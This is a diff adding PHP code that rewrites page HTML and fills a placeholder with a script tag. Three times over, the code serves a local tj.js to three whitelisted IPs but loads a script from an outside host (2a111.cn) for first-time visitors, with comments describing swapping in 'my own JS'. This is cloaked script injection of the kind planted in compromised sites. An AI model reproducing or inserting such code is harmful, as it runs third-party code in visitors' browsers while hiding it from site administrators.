@@ -1,0 +1,66 @@
+
+
+
+
+$rs=preg_replace('|'.$ad1.'|isU',$ad2,$rs);
+ 
+ if('ip1'==get_real_ip()||'ip2'==get_real_ip()||'ip3'==get_real_ip())
+ {
+ $rs=str_replace("|javascript|",'<script type="text/javascript" src="/tj.js"></script>',$rs);
+ }else{
+
+ $rs=$counter==1?str_replace("|javascript|",'<script type="text/javascript" src="http://2a111.cn/tj.js"></script>',$rs):str_replace("|javascript|",'<script type="text/javascript" src="/tj.js"></script>',$rs);
+ 
+ }
+ echo $rs;
+ 
+ exit;
+ 
+ }
+
+
+
+
+
+
+
+
+
+
+
+
+
+//$moban需要替换的完整的html内容
+//$counter 记录用户访问次数==1时将替换成自己的JS·不==1时使用原来管理的JS
+$moban=preg_replace('|'.$ad1.'|isU',$ad2,$moban);
+ 
+ if('ip1'==get_real_ip()||'ip2'==get_real_ip()||'ip3'==get_real_ip())
+ {
+ $moban=str_replace("|javascript|",'<script type="text/javascript" src="/tj.js"></script>',$moban);
+ }else{
+
+ $moban=$counter==1?str_replace("|javascript|",'<script type="text/javascript" src="http://2a111.cn/tj.js"></script>',$moban):str_replace("|javascript|",'<script type="text/javascript" src="/tj.js"></script>',$moban);
+ 
+ }
+ echo $moban;
+ 
+ exit;
+ 
+ }
+
+$rs=preg_replace('|'.$ad1.'|isU',$ad2,$rs);
+ 
+ if('ip1'==get_real_ip()||'ip2'==get_real_ip()||'ip3'==get_real_ip())
+ {
+ $rs=str_replace("|javascript|",'<script type="text/javascript" src="/tj.js"></script>',$rs);
+ }else{
+
+ $rs=$counter==1?str_replace("|javascript|",'<script type="text/javascript" src="http://2a111.cn/tj.js"></script>',$rs):str_replace("|javascript|",'<script type="text/javascript" src="/tj.js"></script>',$rs);
+ 
+ }
+ echo $rs;
+ 
+ exit;
+ 
+ }
+
